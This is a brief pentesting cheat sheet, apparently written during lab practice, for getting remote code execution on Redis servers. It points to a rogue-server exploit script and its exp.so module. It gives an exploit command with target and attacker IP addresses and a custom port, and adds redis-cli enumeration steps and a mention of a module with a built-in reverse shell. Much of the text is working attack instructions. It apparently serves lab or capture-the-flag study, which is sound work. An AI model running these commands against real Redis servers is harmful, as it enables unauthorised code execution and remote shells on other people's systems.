# Redis

https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce

https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html

```bash
# if version is <=5.0.5
can use the rogue server exploit and gain RCE

# if rougeserver cannot, use the py script from here

https://github.com/Ridter/redis-rce

# and then supply the exp.so from https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so

# You may need to define a custom port that is open on the host!

python exploit.py -r 192.168.113.69 -L 192.168.45.152 -P 80 -f exp.so

# if need AUTH, just add a -a <password>

# try connecting to it and enumerating

redis-cli -h <ip>

# if there is no auth, the info command will run

192.168.131.93:6379> info

# try all the different techniques. what worked for the PG Box Sybaris was the Load Redis Module

if you compile the module, you need to find some way to upload it and know the full path to the upload folder

the module itself has an inbuilt reverse shell. Refer to the Sybaris writeup (on google)

```
